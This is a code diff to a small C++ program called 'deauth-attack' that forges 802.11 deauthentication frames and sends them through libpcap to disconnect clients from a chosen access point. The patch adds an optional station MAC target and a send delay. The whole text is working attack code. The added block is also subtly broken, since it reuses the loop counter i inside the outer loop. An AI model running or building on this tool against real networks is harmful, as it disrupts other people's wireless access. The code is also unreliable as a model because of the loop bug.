@@ -15,33 +15,19 @@ void usage()
     std::cout << "sample : deauth-attack mon0 11:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
 }
 
-/*
-struct Param {
-	bool auth{false};
-
-	bool parse(int argc, char* argv[]) {
-		for (int i = 1; i < argc; i++) {
-			if (strcmp(argv[i], "-auth") == 0) {
-				auth = true;
-				continue;
-			}
-		}
-	}
-} param;
-*/
-
 int main(int argc, char *argv[])
 {
-    if(argc != 4 && argc != 5) {
+    if(argc != 3 && argc != 4 && argc != 5) {
         usage();
         return 0;
     }
 
     char* interface = argv[1];
-    uint8_t ap_mac[6];
     int i = 0;
 
-    for(i=0; i<6; i++) {
+    uint8_t ap_mac[MAC_ADDR_LEN];
+
+    for(i=0; i<MAC_ADDR_LEN; i++) {
         ap_mac[i] = strtol(argv[2], NULL, 16);
         argv[2] += 3;
     }
@@ -56,6 +42,14 @@ int main(int argc, char *argv[])
 
     struct Deauth_packet packets;
     for(i=0; i<6; i++) {
+        if(argc == 4) {
+            uint8_t sta_mac[MAC_ADDR_LEN];
+            for(i=0; i<MAC_ADDR_LEN; i++) {
+                sta_mac[i] = strtol(argv[3], NULL, 16);
+                argv[3] += 3;
+            }
+            packets.d_frame.recv_dst_addr[i] = sta_mac[i];
+        }
         packets.d_frame.trans_src_addr[i] = ap_mac[i];
         packets.d_frame.bssid_addr[i] = ap_mac[i];
     }
@@ -65,6 +59,7 @@ int main(int argc, char *argv[])
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
+        sleep(1);
     }
 
     pcap_close(handle);
